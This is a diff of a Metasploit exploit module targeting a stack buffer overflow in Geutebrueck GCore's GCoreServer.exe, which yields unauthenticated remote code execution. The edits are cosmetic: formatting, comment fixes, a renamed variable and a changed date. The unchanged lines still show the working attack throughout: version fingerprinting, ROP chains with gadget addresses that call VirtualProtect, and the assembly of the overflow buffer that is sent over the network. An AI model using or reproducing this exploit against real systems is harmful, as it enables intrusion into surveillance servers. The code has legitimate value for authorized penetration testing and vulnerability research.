@@ -14,33 +14,32 @@ class MetasploitModule < Msf::Exploit::Remote
 
     def initialize(info = {})
         super(update_info(info,
-                          'Name'		   => 'Geutebrueck GCore - GCoreServer.exe Buffer Overflow RCE',
+                          'Name' => 'Geutebrueck GCore - GCoreServer.exe Buffer Overflow RCE',
                           'Description'	=> 'This module exploits a stack Buffer Overflow in the GCore server (GCoreServer.exe). The vulnerable webserver is running on Port 13003 and Port 13004, does not require authentication and affects all versions from 2003 till July 2016 (Version 1.4.YYYYY).',
-                          'License'		=> MSF_LICENSE,
-                          'Author'		 =>
+                          'License' => MSF_LICENSE,
+                          'Author' =>
                           [
                               'Luca Cappiello',
                               'Maurice Popp'
-
                           ],
-                          'References'	 =>
+                          'References' =>
                           [
                               ['www.geutebrueck.com', '']
                           ],
-                          'Platform'	   => 'win',
-                          'Targets'		=>
+                          'Platform' => 'win',
+                          'Targets' =>
                           [
                               ['Automatic Targeting', { 'auto' => true, 'Arch' => ARCH_X86_64 }],
                               ['GCore 1.3.8.42, Windows x64 (Win7, Win8/8.1, Win2012R2,...)', { 'Arch' => ARCH_X86_64 }],
                               ['GCore 1.4.2.37, Windows x64 (Win7, Win8/8.1, Win2012R2,...)', { 'Arch' => ARCH_X86_64 }]
                           ],
-                          'Payload'		=>
+                          'Payload' =>
                           {
                               'Space' => '2000'
                           },
-                          'Privileged'	 => false,
-                          'DisclosureDate' => 'Sep 01 2016',
-                          'DefaultTarget'  => 0))
+                          'Privileged' => false,
+                          'DisclosureDate' => '2017-01-24',
+                          'DefaultTarget' => 0))
     end
 
     def fingerprint
@@ -50,12 +49,10 @@ class MetasploitModule < Msf::Exploit::Remote
         statistics.each do |x|
             if (x.to_s.include? 'GCoreServer') && (x.to_s.include? '1.3.8.42')
                 mytarget = targets[1]
-                # print_status(mytarget.name)
                 print_status("Vulnerable version detected: #{mytarget.name}")
                 return Exploit::CheckCode::Appears, mytarget
             elsif (x.to_s.include? 'GCoreServer') && (x.to_s.include? '1.4.2.37')
                 mytarget = targets[2]
-                # print_status(mytarget.name)
                 print_status("Vulnerable version detected: #{mytarget.name}")
                 return Exploit::CheckCode::Appears, mytarget
                 end
@@ -111,22 +108,21 @@ class MetasploitModule < Msf::Exploit::Remote
             rop += [0x140cc2234].pack('Q<')
             rop += [0x4141414141414141].pack('Q<') * 5 # needed because of the stack aliging with "add rsp, 0x28" ;
             # 0x1400ae2ae    | POP RDX; RETN
-            # 0x...1000        | Value for VP "Size of Memory"
+            # 0x...1000      | Value for VP "Size of Memory"
             rop += [0x1400ae2ae].pack('Q<')
             rop += [0x0000000000000400].pack('Q<')
 
             # 0x14029dc6e:   | POP R8; RET
-            # 0x...40                | Value for VP "Execute Permissions"
+            # 0x...40        | Value for VP "Execute Permissions"
             rop += [0x14029dc6e].pack('Q<')
             rop += [0x0000000000000040].pack('Q<')
 
             # 0x1400aa030    | POP R9; RET
-            # 0x...            | Value for VP "Writeable location". Not sure if needed?
-            # 0x1409AE1A8 is the .data section of gcore; let's test with this writable section...
+            # 0x1409AE1A8 is the .data section of gcore
             rop += [0x1400aa030].pack('Q<')
             rop += [0x1409AE1A8].pack('Q<')
 
-            # 0x140b5927a: xor rax, rax ; et
+            # 0x140b5927a: xor rax, rax ; ret
             rop += [0x140b5927a].pack('Q<')
 
             # 0x1402ce220 pop rax ; ret
@@ -152,7 +148,7 @@ class MetasploitModule < Msf::Exploit::Remote
             # This is needed because the next 16 bytes are sometimes messed up.
             overwrite = [0x140cd9759].pack('Q<')
 
-            # These bytes "\x43" are sacrificed ; we align the stack to jump over this messed up crap.
+            # These bytes "\x43" are sacrificed ; we align the stack to jump over this.
             stack_align = "\x43" * 16
 
             # We have 40 bytes left to align our stack!
@@ -183,18 +179,18 @@ class MetasploitModule < Msf::Exploit::Remote
             rop = ''
             rop += [0x140ccb984].pack('Q<')
             rop += [0x4141414141414141].pack('Q<') * 5 # needed because of the stack aliging with "add rsp, 0x28" ;
-            # 0x14008f7ec    | POP RDX; RETN
+            # 0x14008f7ec      | POP RDX; RETN
             # 0x...1000        | Value for VP "Size of Memory"
             rop += [0x14008f7ec].pack('Q<')
             rop += [0x0000000000000400].pack('Q<')
 
             # 0x140a88f81:   | POP R8; RET
-            # 0x...40                | Value for VP "Execute Permissions"
+            # 0x...40        | Value for VP "Execute Permissions"
             rop += [0x140a88f81].pack('Q<')
             rop += [0x0000000000000040].pack('Q<')
 
             # 0x1400aa030    | POP R9; RET
-            # 0x...            | Value for VP "Writeable location". Not sure if needed?
+            # 0x...          | Value for VP "Writeable location". Not sure if needed?
             # 0x140FB5000 is the .data section of gcore; let's test with this writable section...
             rop += [0x1400aa030].pack('Q<')
             rop += [0x140FB5000].pack('Q<')
@@ -203,7 +199,7 @@ class MetasploitModule < Msf::Exploit::Remote
             rop += [0x140ccea2f].pack('Q<')
 
             # 0x14000efa8 pop rax ; ret
-            # 0x140d83268 | VP Stub IAT Entry #TODO!
+            # 0x140d83268 | VP Stub IAT Entry
             rop += [0x14000efa8].pack('Q<')
             rop += [0x140d83268].pack('Q<')
 
@@ -225,7 +221,6 @@ class MetasploitModule < Msf::Exploit::Remote
       end
 
     def exploit
-        # mytarget = target
         if target['auto']
             checkcode, target = fingerprint
             if checkcode.to_s.include? 'unknown'
@@ -236,7 +231,7 @@ class MetasploitModule < Msf::Exploit::Remote
                     connect
                     print_status('Crafting Exploit...')
 
-                    http_wannabe = 'GET /'
+                    http_req = 'GET /'
                     buffer_200 = "\x41" * 200
                     rop = target_rop
                     payload.encoded
@@ -244,18 +239,16 @@ class MetasploitModule < Msf::Exploit::Remote
                     overwrite = target_overwrite
                     stack_align = target_stack_align
 
-                    exploit = http_wannabe + buffer_200 + rop + payload.encoded + buffer_1823 + overwrite + stack_align
+                    exploit = http_req + buffer_200 + rop + payload.encoded + buffer_1823 + overwrite + stack_align
                     print_status('Exploit ready for sending...')
                     sock.put(exploit, 'Timeout' => 20)
                     print_status('Exploit sent!')
-                    # sleep(10)
                     buf = sock.get_once || ''
                 rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
                     elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
                 ensure
                     print_status('Closing socket.')
                     disconnect
-                    # sleep(10)
                 end
             end
 
@@ -267,7 +260,7 @@ class MetasploitModule < Msf::Exploit::Remote
                 connect
                 print_status('Crafting Exploit...')
 
-                http_wannabe = 'GET /'
+                http_req = 'GET /'
                 buffer_200 = "\x41" * 200
                 rop = target_rop
                 payload.encoded
@@ -275,7 +268,7 @@ class MetasploitModule < Msf::Exploit::Remote
                 overwrite = target_overwrite
                 stack_align = target_stack_align
 
-                exploit = http_wannabe + buffer_200 + rop + payload.encoded + buffer_1823 + overwrite + stack_align
+                exploit = http_req + buffer_200 + rop + payload.encoded + buffer_1823 + overwrite + stack_align
                 print_status('Exploit ready for sending...')
                 sock.put(exploit, 'Timeout' => 20)
                 print_status('Exploit sent!')
@@ -286,7 +279,6 @@ class MetasploitModule < Msf::Exploit::Remote
             ensure
                 print_status('Closing socket.')
                 disconnect
-                # sleep(10)
             end
 
       end
